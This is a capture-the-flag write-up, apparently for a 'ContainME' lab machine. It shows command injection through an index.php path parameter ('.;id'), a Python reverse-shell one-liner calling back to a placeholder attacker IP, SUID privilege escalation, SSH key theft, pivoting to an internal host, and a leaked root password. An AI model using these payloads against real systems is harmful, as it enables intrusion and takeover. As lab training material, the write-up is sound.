# ContainME WriteUp
## Machine IP = 10.113.156.18
At first, I need to do a port scan:
```bash
rustscan -a 10.113.156.18 -r 1-65535
```
It gave me four open ports like [22, 80, 2222, 8022]. I checked their versions and etc but saw that they aren't needed.
```bash
nmap -sCV -p2222,8022 -A
```
Let's look at the website. There was nothing. So, we need to find directories.
```bash
ffuf -u http://10.113.156.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
```
|  
<img width="1289" height="259" alt="Screenshot From 2026-02-21 14-18-00" src="https://github.com/user-attachments/assets/57857209-78f1-4dbf-8a0e-f41f696cdf1b" />
|  
Index.php and info.php looks interesting. Let's try the first one.  
|  
<img width="1126" height="306" alt="Screenshot From 2026-02-21 14-21-00" src="https://github.com/user-attachments/assets/eb39a6c0-1b92-49f0-a84c-5155f18bfe16" />
|  
Hmm I think it shows the content of /var/www/html folder. When I look at the source code, I saw a hint: *"<!--  where is the path ?  -->"*. 

----

I tried this url but it didn't work:
```bash
http://10.113.156.18/index.php?path=id
```
Then I remembered that when I write it like his, it think id is a file and it doesn't take it as a command. That is whey we neet to write it like this:
```bash
http://10.113.156.18/index.php?path=.;id
```
|  
<img width="1163" height="306" alt="Screenshot From 2026-02-21 14-29-47" src="https://github.com/user-attachments/assets/22c11556-ed2f-4eb2-a0fd-11486b509e76" />
|  
Yeah It worked. The first thing I wanted to try is reverse shell. But at first I must be sure that this server use python or not. So I used this url to figure it out "http://10.113.156.18/index.php?path=.;which python3". Yeah It has. So lets use our reverse shell payload.
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Don't forget to convert it into URL format before pasteing into url. I accessed as www-data user. I cannot read any user's file, so the first thing i need to do is to find a useful SUID binary file.
```bash
find / -perm /4000 2>/dev/null
```
|   
<img width="768" height="703" alt="Screenshot From 2026-02-21 14-36-54" src="https://github.com/user-attachments/assets/ddc1f0ff-d56f-41ba-8c57-e952c6d4941f" />
|  
Yeah,we can use it but what is it? I searched about it a lot and didn't get any GTFObins result or a walkthrough that how we can use it. So, I decided to check so much thing with it because I also cannot read it. Then, i tried "./crypt mike" and it worked.
|  
<img width="1134" height="329" alt="Screenshot From 2026-02-21 14-47-53" src="https://github.com/user-attachments/assets/ecdb7d9b-00b5-448c-9ba8-d12977466678" />
|  
Yeah I am root right now only for this container. I looked at so much thing on there but saw that I can use my root privileges only for getting RSA key of mike. It is very useful for us because as you remember we couldn't read it wen we were www-data user.

----

```bash
ssh -i id_rsa mike@10.113.156.18
```
When I wanted to access mike user,I saw that there is a problem. The user cannot be accessed over Machine's IP. Owww, maybe there is other interfaces. Let's check:
|  
<img width="1049" height="858" alt="Screenshot From 2026-02-21 14-53-39" src="https://github.com/user-attachments/assets/22fad7c0-f808-49e1-a123-86eb25e20229" />
|  
Yeah, I saw that there is additional interfaces. I checked all of these IP's but none of them worked. The eth1 interface was running in a different IP than the main box. So, I used a simple code to find which IP in that subnet works right now.
```bash
for ip in $(seq 1 255  );do ping -c 1 172.16.20.$ip;done
```
|   
<img width="1418" height="1116" alt="Screenshot From 2026-02-21 14-57-27" src="https://github.com/user-attachments/assets/bfe7452e-8d8b-45f2-baf1-0dc2e69999ad" />
|  
Look at hese IP addresses. Any of them sent the packet again to us except **"172.16.20.6"**. We got a response from it. It means that mike user can be accessible from this IP.
```bash
ssh -i id_rsa mike@172.16.20.6
```
|   
<img width="756" height="86" alt="Screenshot From 2026-02-21 15-01-59" src="https://github.com/user-attachments/assets/ac85a1cb-ad88-4238-81bd-5f73b3c31b26" />
|  
Yeahh, look at it. I am already mike user on host2. I didn't find aynthing important so, decided to find netstat connections to find which processes run right now.
```bash
netstat -tulnp
```
|  
<img width="1383" height="196" alt="Screenshot From 2026-02-21 15-04-20" src="https://github.com/user-attachments/assets/d20a384f-da9c-4a19-89c1-068baa3aa2a8" />
|  
There is MySql -> port 3306. But I didn't have credentials. I decided to check default ones but not sure if it would work. I saw that username-mike and password-password worked.
```bash
mysql -umike -ppassword
```
|  
<img width="996" height="1048" alt="Screenshot From 2026-02-21 15-07-31" src="https://github.com/user-attachments/assets/ceae5c52-79f3-4e79-bb56-bebc9d85b80c" />
|  
BINGOOOO!!!!, We got root password and a password which is asigned for mike. Lets be root.
```bash
mike@host2:~$ su root
su root
Password: bjsig4868fgjjeog

root@host2:/home/mike#
```
There was a "mike.zip" file in root's home folder. When I wanted to unzip it, It required password. We have already found it on MySQL database. After unzip it, we got the FLAG.


































